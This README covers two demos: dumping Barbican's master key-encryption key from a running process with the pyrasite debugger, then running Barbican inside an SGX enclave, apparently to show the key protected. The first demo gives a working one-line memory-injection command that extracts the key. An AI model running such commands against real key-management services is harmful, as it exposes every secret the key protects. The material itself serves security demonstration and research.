# Barbican key scraping demo

Start the container:

    docker run -it --name barbican --privileged 513076507034.dkr.ecr.us-west-1.amazonaws.com/barbican-demo:20170726-04ee216

Get a shell in the container:

    docker exec -it barbican /bin/bash

Dump the master KEK from the barbican process using the pyrasite python debugger:

    echo "sys.modules['barbican.plugin.crypto.manager'].get_manager().extensions[0].obj.master_kek" | pyrasite-shell 1

# Barbican SGX demo

    cd LibOS/shim/test/apps
    make SGX=1 regress_barbican
    cd barbican/root
    ~/work/zircon-sgx/Runtime/pal-Linux-SGX python.manifest.sgx /usr/local/bin/paster serve /etc/barbican/barbican-api-paste.ini

Create and retrieve a secret:

    curl -X POST -H 'content-type:application/json' -H 'X-Project-Id: 12345' -d '{"payload": "my-secret-here", "payload_content_type": "text/plain"}' http://localhost:9311/v1/secrets
    curl -H 'X-Project-Id: 12345' <URL from previous command>
